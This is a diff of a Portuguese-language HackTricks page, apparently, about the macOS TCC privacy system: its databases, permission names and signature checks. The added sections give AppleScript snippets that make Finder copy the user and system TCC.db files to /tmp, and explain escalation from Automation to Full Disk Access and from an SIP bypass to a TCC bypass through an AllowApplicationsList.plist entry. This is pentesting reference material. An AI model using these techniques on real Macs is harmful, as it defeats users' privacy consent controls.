@@ -39,12 +39,12 @@ As permissões são herdadas do aplicativo pai e as permissões são rastreadas 
 As seleções são então armazenadas no banco de dados do TCC em todo o sistema em **`/Library/Application Support/com.apple.TCC/TCC.db`** ou em **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário. Os bancos de dados são protegidos contra edição com SIP (System Integrity Protection), mas você pode lê-los.
 
 {% hint style="danger" %}
-O banco de dados do TCC no iOS está em **`/private/var/mobile/Library/TCC/TCC.db`**
+O banco de dados do TCC no **iOS** está em **`/private/var/mobile/Library/TCC/TCC.db`**
 {% endhint %}
 
 Existe um terceiro banco de dados do TCC em **`/var/db/locationd/clients.plist`** para indicar os clientes autorizados a acessar os serviços de localização.
 
-Além disso, um processo com acesso total ao disco pode editar o banco de dados do modo de usuário. Agora, um aplicativo também precisa de FDA para ler o banco de dados.
+Além disso, um processo com acesso total ao disco pode editar o banco de dados do modo de usuário. Agora, um aplicativo também precisa de FDA ou **`kTCCServiceEndpointSecurityClient`** para ler o banco de dados (e modificar o banco de dados dos usuários).
 
 {% hint style="info" %}
 A interface do usuário do centro de notificações pode fazer alterações no banco de dados do TCC do sistema:
@@ -119,13 +119,17 @@ Verificando ambos os bancos de dados, você pode verificar as permissões que um
 {% hint style="info" %}
 Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode verificar esta [**lista de permissões conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
 
-O **Acesso Total ao Disco** tem o nome **`kTCCServiceSystemPolicyAllFiles`** e o **`kTCCServiceAppleEvents`** permite que o aplicativo envie eventos para outros aplicativos que são comumente usados para **automatizar tarefas**. Além disso, o **`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário que altera sua pasta pessoal e, portanto, permite **burlar o TCC**.
+**Acesso Total ao Disco** é nomeado como **`kTCCServiceSystemPolicyAllFiles`** e **`kTCCServiceAppleEvents`** permite que o aplicativo envie eventos para outros aplicativos que são comumente usados para **automatizar tarefas**.
+
+**kTCCServiceEndpointSecurityClient** é uma permissão do TCC que também concede privilégios elevados, incluindo a opção de escrever no banco de dados dos usuários.
+
+Além disso, **`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário que altera sua pasta pessoal e, portanto, permite **burlar o TCC**.
 {% endhint %}
 
 Você também pode verificar as **permissões já concedidas** aos aplicativos em `Preferências do Sistema --> Segurança e Privacidade --> Privacidade --> Arquivos e Pastas`.
 
 {% hint style="success" %}
-Observe que, mesmo que um dos bancos de dados esteja dentro da pasta do usuário, **os usuários não podem modificar diretamente esses bancos de dados por causa do SIP** (mesmo se você for root). A única maneira de configurar ou modificar uma nova regra é por meio do painel de Preferências do Sistema ou de prompts em que o aplicativo solicita ao usuário.
+Observe que, mesmo que um dos bancos de dados esteja dentro da pasta pessoal do usuário, **os usuários não podem modificar diretamente esses bancos de dados devido ao SIP** (mesmo se você for root). A única maneira de configurar ou modificar uma nova regra é por meio do painel de Preferências do Sistema ou prompts em que o aplicativo solicita ao usuário.
 
 No entanto, lembre-se de que os usuários _podem_ **excluir ou consultar regras** usando o **`tccutil`**.
 {% endhint %}
@@ -137,53 +141,6 @@ tccutil reset All app.some.id
 
 # Reset the permissions granted to all apps
 tccutil reset All
-```
-### Escalação de privilégios do banco de dados do usuário TCC para FDA
-
-Obter permissões de escrita sobre o banco de dados do usuário TCC não permite conceder permissões de FDA a si mesmo, apenas aquele que está no banco de dados do sistema pode conceder isso.
-
-Mas você pode se dar direitos de automação para o Finder e, como o Finder tem FDA, você também terá.
-
-### Do desvio do SIP para o desvio do TCC
-
-Os bancos de dados do TCC são protegidos pelo SIP, por isso apenas processos com as permissões indicadas poderão modificá-los. Portanto, se um invasor encontrar um desvio do SIP em um arquivo (capaz de modificar um arquivo restrito pelo SIP), ele poderá remover a proteção de um banco de dados do TCC e conceder a si mesmo todas as permissões do TCC.
-
-No entanto, há outra opção para abusar desse desvio do SIP para burlar o TCC, o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que requerem uma exceção do TCC. Portanto, se um invasor puder remover a proteção do SIP deste arquivo e adicionar seu próprio aplicativo, o aplicativo poderá burlar o TCC.
-Por exemplo, para adicionar o terminal:
-```bash
-# Get needed info
-codesign -d -r- /System/Applications/Utilities/Terminal.app
-```
-AllowApplicationsList.plist:
-
-Este arquivo é usado pelo macOS para controlar quais aplicativos têm permissão para acessar dados protegidos pela TCC (Transparency, Consent, and Control). A TCC é um recurso de segurança do macOS que protege informações confidenciais, como contatos, calendários, câmera e microfone, exigindo que os aplicativos solicitem permissão ao usuário antes de acessá-las.
-
-O AllowApplicationsList.plist contém uma lista de identificadores de pacotes de aplicativos que foram concedidos permissão para acessar dados protegidos pela TCC. Esses identificadores de pacotes são exclusivos para cada aplicativo e são usados pelo sistema operacional para identificar e rastrear as permissões concedidas.
-
-Ao modificar o AllowApplicationsList.plist, é possível adicionar ou remover identificadores de pacotes de aplicativos para controlar quais aplicativos têm acesso aos dados protegidos pela TCC. No entanto, é importante ter cuidado ao fazer alterações nesse arquivo, pois modificações incorretas podem levar a problemas de segurança ou a aplicativos não funcionando corretamente.
-
-Para editar o AllowApplicationsList.plist, você pode usar um editor de texto ou a linha de comando. Certifique-se de seguir as diretrizes e recomendações da Apple ao fazer alterações nesse arquivo para garantir a segurança e o bom funcionamento do seu sistema macOS.
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-<key>Services</key>
-<dict>
-<key>SystemPolicyAllFiles</key>
-<array>
-<dict>
-<key>CodeRequirement</key>
-<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
-<key>IdentifierType</key>
-<string>bundleID</string>
-<key>Identifier</key>
-<string>com.apple.Terminal</string>
-</dict>
-</array>
-</dict>
-</dict>
-</plist>
 ```
 ### Verificações de Assinatura do TCC
 
@@ -260,8 +217,107 @@ uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 Também observe que se você mover um arquivo que permite o UUID de um aplicativo em seu computador para um computador diferente, porque o mesmo aplicativo terá UIDs diferentes, ele não concederá acesso a esse aplicativo.
 {% endhint %}
 
-O atributo estendido `com.apple.macl` **não pode ser removido** como outros atributos estendidos porque ele é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.
+O atributo estendido `com.apple.macl` **não pode ser removido** como outros atributos estendidos porque está **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.
 
+## Privilégios de Escalação e Bypass do TCC
+
+### Escalação de Privilégios de Automação para FDA
+
+O **Finder** é um aplicativo que **sempre possui FDA** (mesmo que não apareça na interface), portanto, se você tiver privilégios de **Automação** sobre ele, poderá abusar de seus privilégios para **fazer com que ele execute algumas ações**.
+
+{% tabs %}
+{% tab title="Roubar o TCC.db dos usuários" %}
+```applescript
+# This AppleScript will copy the system TCC database into /tmp
+osascript<<EOD
+tell application "Finder"
+set homeFolder to path to home folder as string
+set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
+set targetFolder to POSIX file "/tmp" as alias
+
+try
+duplicate file sourceFile to targetFolder with replacing
+on error errMsg
+display dialog "Error: " & errMsg
+end try
+end tell
+EOD
+```
+{% tab title="Roubar o TCC.db do sistema" %}
+```applescript
+osascript<<EOD
+tell application "Finder"
+set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
+set targetFolder to POSIX file "/tmp" as alias
+
+try
+duplicate file sourceFile to targetFolder with replacing
+on error errMsg
+display dialog "Error: " & errMsg
+end try
+end tell
+EOD
+```
+{% endtab %}
+{% endtabs %}
+
+Você pode abusar disso para **escrever seu próprio banco de dados TCC de usuário**.
+
+Esta é a solicitação TCC para obter privilégios de automação sobre o Finder:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>
+
+### Escalação de privilégios do banco de dados TCC do usuário para FDA
+
+Obtendo **permissões de escrita** sobre o **banco de dados TCC do usuário**, você não pode conceder a si mesmo permissões de **`FDA`**, apenas aquele que está no banco de dados do sistema pode conceder isso.
+
+Mas você pode se dar **direitos de automação para o Finder**, e abusar da técnica anterior para escalar para FDA.
+
+### **Escalação de privilégios do FDA para permissões TCC**
+
+Eu não acho que isso seja uma escalação de privilégios real, mas apenas no caso de você achar útil: se você controla um programa com FDA, você pode **modificar o banco de dados TCC dos usuários e se dar qualquer acesso**. Isso pode ser útil como uma técnica de persistência caso você perca suas permissões do FDA.
+
+### **Do SIP Bypass para o Bypass do TCC**
+
+O banco de dados **TCC do sistema** é protegido pelo **SIP**, por isso apenas processos com as **autorizações indicadas serão capazes de modificá-lo**. Portanto, se um invasor encontrar um **bypass do SIP** em um **arquivo** (ser capaz de modificar um arquivo restrito pelo SIP), ele será capaz de **remover a proteção** de um banco de dados TCC e se dar todas as permissões do TCC.
+
+No entanto, há outra opção para abusar desse **bypass do SIP para contornar o TCC**, o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que requerem uma exceção do TCC. Portanto, se um invasor puder **remover a proteção do SIP** deste arquivo e adicionar seu **próprio aplicativo**, o aplicativo poderá contornar o TCC.\
+Por exemplo, para adicionar o terminal:
+```bash
+# Get needed info
+codesign -d -r- /System/Applications/Utilities/Terminal.app
+```
+AllowApplicationsList.plist:
+
+Este arquivo é usado pelo macOS para controlar quais aplicativos têm permissão para acessar dados protegidos pela TCC (Transparency, Consent, and Control). A TCC é um recurso de segurança do macOS que protege informações confidenciais, como contatos, calendários, câmera e microfone, exigindo que os aplicativos solicitem permissão ao usuário antes de acessá-las.
+
+O AllowApplicationsList.plist contém uma lista de identificadores de pacotes de aplicativos que foram concedidos permissão para acessar dados protegidos pela TCC. Esses identificadores de pacotes são exclusivos para cada aplicativo e são usados pelo sistema operacional para identificar e rastrear as permissões concedidas.
+
+Ao modificar o AllowApplicationsList.plist, é possível adicionar ou remover identificadores de pacotes de aplicativos para controlar quais aplicativos têm acesso aos dados protegidos pela TCC. No entanto, é importante ter cuidado ao fazer alterações nesse arquivo, pois modificações incorretas podem levar a problemas de segurança ou a aplicativos não funcionando corretamente.
+
+Para editar o AllowApplicationsList.plist, você pode usar um editor de texto ou a linha de comando. Certifique-se de seguir as diretrizes e recomendações da Apple ao fazer alterações nesse arquivo para garantir a segurança e o bom funcionamento do seu sistema macOS.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Services</key>
+<dict>
+<key>SystemPolicyAllFiles</key>
+<array>
+<dict>
+<key>CodeRequirement</key>
+<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
+<key>IdentifierType</key>
+<string>bundleID</string>
+<key>Identifier</key>
+<string>com.apple.Terminal</string>
+</dict>
+</array>
+</dict>
+</dict>
+</plist>
+```
 ### Bypasses do TCC
 
 {% content-ref url="macos-tcc-bypasses/" %}
@@ -272,7 +328,8 @@ O atributo estendido `com.apple.macl` **não pode ser removido** como outros atr
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
-*   [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 
 
@@ -281,7 +338,7 @@ O atributo estendido `com.apple.macl` **não pode ser removido** como outros atr
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
